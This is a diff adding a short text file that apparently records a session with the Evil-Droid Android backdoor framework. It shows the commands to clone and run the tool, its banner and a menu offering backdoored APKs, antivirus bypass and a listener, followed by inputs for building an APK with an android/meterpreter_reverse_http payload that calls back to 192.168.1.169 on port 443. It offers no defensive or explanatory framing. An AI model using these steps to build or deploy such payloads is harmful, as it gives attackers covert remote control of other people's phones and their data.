@@ -1,0 +1,58 @@
+git clone https://github.com/M4sc3r4n0/Evil-Droid
+cd Evil-Droid
+chmod +x evil-droid
+sudo ./evil-droid
+              .           .                                                                    
+              M.          .M                                                                   
+               MMMMMMMMMMM.                                                                    
+            .MMM\MMMMMMM/MMM.                                                                  
+           .MMM.7MMMMMMM.7MMM.                                                                 
+          .MMMMMMMMMMMMMMMMMMM                                                                 
+          MMMMMMM.......MMMMMMM                                                                
+          MMMMMMMMMMMMMMMMMMMMM                                                                
+     MMMM MMMMMMMMMMMMMMMMMMMMM MMMM                                                           
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+    dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD                                                          
+     MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM                                                           
+          MMMMMMMMMMMMMMMMMMMMM                                                                
+          MMMMMMMMMMMMMMMMMMMMM                                                                
+              MMMMM   MMMMM  v0.3                                                              
+              MMMMM   MMMMM                                                                    
+              MMMMM   MMMMM                                                                    
+              MMMMM   MMMMM                                                                    
+              .MMM.   .MMM.                                                                    
+      Mascerano Bachir - Dev-labs                                                              
+                                                                                               
+╔──────────────────────────────────────────────╗                                               
+|          Evil-Droid Framework v0.3           |                                               
+|      Hack & Remote android plateform         |                                               
+┖──────────────────────────────────────────────┙                                               
+[1] APK MSF                                                                                    
+[2] BACKDOOR APK ORIGINAL (OLD)                                                                
+[3] BACKDOOR APK ORIGINAL (NEW)                                                                
+[4] BYPASS AV APK (ICON CHANGE)                                                                
+[5] START LISTENER                                                                             
+[c] CLEAN                                                                                      
+[q] QUIT                                                                                       
+[?] Select>: 1                                                                                 
+                                                                                               
+ [✔] APK MSF                                                                                   
+                                                                                               
+                                                                                               
+                                                                                               
+[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++    ]                               
+[*] Generating apk payload                                                                     
+[ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   ]                               
+                                                                                               
+192.168.1.169
+443
+inserisci il nome
+android/meterpreter_reverse_http
+multiender
+
+
